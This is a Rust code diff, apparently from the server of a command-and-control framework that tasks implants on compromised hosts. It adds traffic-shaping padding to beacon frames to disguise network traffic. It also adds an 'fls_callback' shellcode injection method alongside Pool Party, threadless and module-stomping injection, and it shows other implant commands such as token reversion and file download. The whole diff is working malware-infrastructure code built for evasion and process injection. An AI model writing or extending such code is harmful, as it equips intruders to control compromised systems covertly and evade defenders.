@@ -1180,7 +1180,8 @@ fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
         return (StatusCode::OK, body_bytes(frame)).into_response();
     };
     let env = nyx_profile::post_server_envelope(profile);
-    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() {
+    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() && env.padding_max == 0
+    {
         // No envelope declared — raw frame, legacy behaviour.
         return (StatusCode::OK, body_bytes(frame)).into_response();
     }
@@ -1416,6 +1417,13 @@ fn handle_beacon_unwrap_frame(
                 ),
                 _ => body,
             };
+            // Strip traffic-shaping padding BEFORE decode — it is appended
+            // after the transform chain on the wire (self-delimiting length
+            // suffix), so it must come off first. A padding-only profile has
+            // empty steps, hence this runs even when `env.steps` is empty.
+            let on_wire = env
+                .strip_padding(on_wire)
+                .map_err(|e| anyhow::anyhow!("client envelope padding strip failed: {e}"))?;
             if env.steps.is_empty() {
                 parse_frame(on_wire)?
             } else {
@@ -2545,7 +2553,7 @@ enum JsonCommand {
     Rev2Self,
     /// 查询当前线程身份（DOMAIN\user + 是否持有令牌）。
     GetUid,
-    /// 注入 shellcode 到目标进程。method=0 Pool Party(暂走 stomp)/1 threadless/2 stomp。
+    /// 注入 shellcode 到目标进程。method=0 Pool Party(暂走 stomp)/1 threadless/2 stomp/3 fls_callback。
     Inject {
         method: u8,
         pid: u32,
@@ -2896,10 +2904,20 @@ async fn post_task(
             pid,
             spawn_to,
             ..
-        } => serde_json::json!({
-            "task_id": task_id, "command": "inject",
-            "method": method, "pid": pid, "spawn_to": spawn_to
-        }),
+        } => {
+            let method_name = match method {
+                0 => "pool_party",
+                1 => "threadless",
+                2 => "module_stomp",
+                3 => "fls_callback",
+                _ => "unknown",
+            };
+            serde_json::json!({
+                "task_id": task_id, "command": "inject",
+                "method": method, "method_name": method_name,
+                "pid": pid, "spawn_to": spawn_to
+            })
+        }
         Command::Download { path } => serde_json::json!({
             "task_id": task_id, "command": "download", "path": truncate(path, 256)
         }),
